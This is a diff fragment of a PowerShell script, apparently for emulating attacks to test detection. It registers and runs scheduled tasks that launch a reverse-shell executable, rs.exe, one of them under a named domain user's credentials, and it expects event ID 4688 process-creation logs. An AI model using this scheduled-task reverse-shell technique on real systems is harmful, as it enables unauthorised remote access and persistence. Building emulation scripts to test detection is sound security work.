@@ -1294,6 +1294,13 @@ Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$tas
 Start-ScheduledTask -TaskName "RunReverseShell"
 schtasks /run /tn "RunReverseShell"
 
+# attempt 2
+Write-Output "[+] Attempt 2: Emulating RS running under candice..."
+`$action2 = New-ScheduledTaskAction  -Execute rs.exe  -WorkingDirectory `$Path
+Register-ScheduledTask -TaskName "RShell2" -Action `$action2 -User "ODOMAIN\candice.kevin" -Password `$Password.
+start-sleep 2
+Start-ScheduledTask -TaskName "RShell2"
+
 Write-Output "`n[+] There should be 4688 events for rs.exe."
 
 
